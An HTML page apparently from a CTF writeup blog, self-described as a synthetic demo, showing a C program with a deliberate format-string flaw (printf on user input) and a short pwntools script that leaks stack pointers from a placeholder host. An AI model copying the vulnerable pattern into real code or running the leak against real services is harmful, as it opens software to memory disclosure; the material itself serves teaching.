<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Misc: Format String Leak | Ocean Writeups</title>
    <meta name="description" content="Quick leak-and-parse workflow for a format string challenge." />
    <link rel="stylesheet" href="/assets/styles.css" />
    <link rel="stylesheet" href="/assets/prism.css" />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"
    />
  </head>
  <body>
    <div class="page-bg"></div>
    <header class="site-header" aria-hidden="true"></header>
    <main class="container">
      <article class="post glass">
  <a href="/#writeups" class="back-link">
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path
        d="M15 6l-6 6 6 6"
        fill="none"
        stroke="currentColor"
        stroke-width="1.5"
        stroke-linecap="round"
        stroke-linejoin="round"
      />
    </svg>
    Back to writeups
  </a>
  <header class="post-header">
    <p class="eyebrow">Writeup</p>
    <h1>Misc: Format String Leak</h1>
    <div class="post-meta">
      <span>Jul 10, 2024</span>
      
      <span class="meta-pill">Misc</span>
      
      
      <span class="meta-pill">Easy</span>
      
      
      <div class="tag-row">
        
        <span class="meta-pill">HTB</span>
        
      </div>
      
    </div>
  </header>
  <div class="post-content prose">
    <p>A short, synthetic writeup to showcase syntax highlighting for C and Python.</p>
<h2>Vulnerable snippet (C)</h2>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(void) {
    char name[64];
    puts(&quot;Enter your name:&quot;);
    if (!fgets(name, sizeof(name), stdin)) {
        return 1;
    }
    name[strcspn(name, &quot;\n&quot;)] = '\0';

    /* Vulnerable: user-controlled format string */
    printf(name);
    printf(&quot;\n&quot;);
    return 0;
}
</code></pre>
<h2>Quick exploit (Python)</h2>
<pre><code class="language-python">from pwn import remote

io = remote(&quot;example.ctf&quot;, 31337)

# Leak stack values; grab a pointer-like value for a base calc.
io.sendline(b&quot;%p %p %p %p %p %p&quot;)
leak = io.recvline().strip().split()

print(&quot;leaks:&quot;, leak)

# Example parse: take the 5th leak and compute a fake base.
ptr = int(leak[4], 16)
base = ptr - 0x1234
print(&quot;base:&quot;, hex(base))
</code></pre>

  </div>
</article>

    </main>
  </body>
</html>
